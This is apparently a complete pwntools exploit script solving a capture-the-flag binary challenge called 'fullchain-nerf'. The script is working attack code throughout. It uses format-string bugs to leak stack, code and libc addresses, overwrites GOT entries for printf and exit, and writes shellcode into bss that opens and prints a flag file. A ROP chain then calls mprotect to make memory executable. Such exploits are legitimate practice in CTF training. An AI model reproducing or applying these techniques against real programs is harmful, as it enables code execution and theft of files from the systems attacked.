from pwn import *
split = lambda v,sz: [v[i:i+sz] for i in range(0,len(v),sz)]

HOST, PORT = 'edu-ctf.zoolab.org', 30206
if args.HOST: HOST = args.HOST
if args.PORT: PORT = args.PORT

exe = context.binary = ELF('./fullchain-nerf/share/fullchain-nerf')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if args.REMOTE:
    io = remote(HOST,PORT)
else:
    io = process(exe.path)
    pause()

show = True
def fmt(payload, local=True):
    if type(payload) == str:
        payload = payload.encode()
    if local:
        if show: io.readuntil(b'>')
        io.sendline(b'local')
        assert len(payload) <= 11
        if len(payload) != 11:
            payload += b'\n'
        if show: io.readuntil(b'>')
        io.send(b'write' + payload)
    else:
        if show: io.readuntil(b'>')
        io.sendline(b'global')
        if show: io.readuntil(b'>')
        io.sendline(b'read')
        if show: io.readuntil(b'>')
        io.sendline(str(len(payload)).encode())
        io.send(payload)
        if show: io.readuntil(b'>')
        io.sendline(b'global')
        if show: io.readuntil(b'>')
        io.sendline(b'write')
    if show:
        res = io.readuntil(b'global or local', drop=True)
        if local:
            res = res[6:]
        return res

def place(a, b = 0):
    if show: io.readuntil(b'>')
    io.sendline(b'local')
    if show: io.readuntil(b'>')
    io.sendline(b'read')
    if show: io.readuntil(b'>')
    io.sendline(str(24).encode())
    io.send(flat({ 0x10: a, 0x8: b }))

def write(addr, payload):
    place(addr)
    fmt('%12$s', 0)
    assert b'\n' not in payload and b' ' not in payload
    io.sendline(payload)

# 1. leak rsp
rsp = int(fmt('%7$p'),16)
info(f'rsp: {hex(rsp)}')
# 2. place ptr to &cnt
place(rsp+0x26)
# 3. FSB write to cnt
fmt('%12$n')

# leak code base
exe.address = int(fmt('%6$p'),16) - exe.sym['__libc_csu_init']
info(f'code base: {hex(exe.address)}')

# leak libc base
place(exe.got.printf)
libc.address = u64(fmt('%12$s').ljust(8,b'\0')) - libc.sym.printf
info(f'libc base: {hex(libc.address)}')

# overwrite printf@got to scanf
target = p64(libc.sym.scanf)
sz = target[1]*0x100 + target[0]
# place(exe.got.printf)
show = False
fmt('%{}c%12$hn|'.format(sz), 0)
io.readuntil(b'|')

# write shellcode to bss
sc = exe.sym['global'] + 0xFF
fn = b'/home/fullchain-nerf/flag'.ljust(0x30, b'\0')
fn_addr = sc - len(fn)
shellcode = asm(f'''
xor rdx, rdx
xor rsi, rsi
mov rdi, {fn_addr}
mov rax, 2
syscall
mov rdx, 0x30
mov rsi, {fn_addr}
mov rdi, rax
mov rax, 0
syscall
mov rdi, 1
mov rax, 1
syscall
''')
write(fn_addr, fn + shellcode)

# generate ROP chain
rop = ROP(libc)
rop.mprotect(exe.address, 0x5000, 0x7)
rop.raw(sc)
# print(rop.dump())
rop_chain = split(rop.chain(),4)
rop_chain[9] = p32(u32(rop_chain[9])+1)
rop_chain = b''.join(rop_chain)

# overwrite exit@got to `pop rdi; ret`
write(exe.got.exit, p64(rop.rdi.address))
write(rsp, rop_chain)

# pause()
s = 0
io.sendline(rop_chain[s:s+7])

# io.interactive()

flag = io.readuntil(b'}').strip().decode()
success(flag)
